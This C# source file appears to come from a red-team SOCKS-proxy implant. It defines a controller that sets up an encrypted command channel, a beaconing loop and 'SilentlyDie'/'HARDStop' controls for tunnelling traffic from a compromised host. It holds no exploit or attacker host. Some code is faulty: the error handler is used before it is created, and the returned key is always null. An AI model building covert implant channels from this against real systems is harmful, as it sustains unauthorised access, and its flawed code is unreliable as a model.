using Common.Classes.Encryption;
using ImplantSide.Classes.Comms;
using ImplantSide.Classes.Constants;
using ImplantSide.Classes.ErrorHandler;
using ImplantSide.Interfaces;
using SocksProxy.Classes.Socks;
using System;
using System.Collections.Generic;


namespace ImplantSide.Classes.Socks
{
    public class SocksController
    {
        public IEncryptionHelper Encryptor { get; set; }
        public IImplantLog ImplantComms { get; set; }

        object _locker = new Object();
        List<String> _errorQueue = new List<String>();
        CommandChannelController _cmdChannel;
        CommandCommunicationHandler _cmdCommsHandler;
        SocksLoopController _sockLoopctrller;
        InternalErrorHandler _error;
        SocksClientConfiguration _config;

        public SocksController(SocksClientConfiguration config)
        {
            List<string> mesg = new List<String>();
            if (config == null)
                throw new Exception("Config object is null");
            if (config.CommandServerUI == null)
                mesg.Add("ProxyIP is null");
            if (config.ImplantComms == null)
                throw new Exception("Implant callback is null");

            _config = config;

            if (mesg.Count > 0)
                _error.LogError(mesg);
        }

        public string Initialize()
        {
            string pubKey = null;
            try
            {
                _error = new InternalErrorHandler(_config.ImplantComms);
                _cmdCommsHandler = new CommandCommunicationHandler(Encryptor, _config, _error) { ImplantComms = ImplantComms };
				Int16 beaconTime = (_config.BeaconTime > 0) ? _config.BeaconTime : (short)400;
				_sockLoopctrller = new SocksLoopController(ImplantComms, _cmdCommsHandler, beaconTime)
                {
                    Encryption = Encryptor,
                    ErrorHandler = _error
                };
                _cmdChannel = new CommandChannelController(_config.CommandChannel, _sockLoopctrller, _cmdCommsHandler, _error) { ImplantComms = ImplantComms };
            }
            catch (Exception ex)
            {
                var mesg = new List<String>
                {
                    "Failed to derive server key",
                    ex.Message
                };
                _error.LogError(mesg);
            }
            return pubKey;
        }

        public bool SendViaImplant { get; set; }
        public bool SilentlyDie { get; set; }
        public STATUS Status { get; set; }

        public bool Start()
        {
            _cmdChannel.StartCommandLoop(this);
            return true;
        }

		public void StopProxyComms() //This is used by the command loop controller in case that it dies
		{
			_sockLoopctrller.StopAll();
		}

        public void Stop()
        {
            _cmdChannel.StopCommandChannel();
            _sockLoopctrller.StopAll();
        }

        public void HARDStop()
        {
            _cmdChannel.StopCommandChannel();
            _sockLoopctrller.HARDStopAll();
        }
    }
}
